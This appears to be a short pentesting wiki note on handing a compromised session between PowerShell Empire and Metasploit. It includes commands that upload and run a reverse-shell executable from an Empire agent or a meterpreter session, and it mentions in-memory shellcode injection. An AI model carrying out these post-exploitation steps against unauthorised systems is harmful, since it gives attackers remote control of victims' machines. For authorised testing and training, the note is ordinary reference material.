# Switching Between Empire And Metasploit

When switching between [[Metasploit]] and [[Empire]], using one of the [[MSFVenom-Payloads]]

## Caveats
In PowerShell Empire version 2.4, it was possible to use a meterpreter listener and the injectshellcode module to inject a meterpreter shellcode directly in memory from PowerShell. However, in the newest version (2.5) this code is unfortunately broken.

## Empire to Metasploit
With `multi/handler` waiting on the same `LHOST` and `LPORT` configuration with  one of the [[MSFVenom-Payloads]] 
```powershell
Empire: <AgentName> > upload /path/to/reverse/shell.exe
Empire: <AgentName> > shell /path/to/reverse/shell.exe
```

## Metasploit to Empire
Either with [[Meterpreter-Commands]]
```powershell
meterpreter > upload /path/to/reverse/shell.exe
shell
```
Or regular builtin techniques for [[File-Transfers]] or [[Windows-File-Transfers]].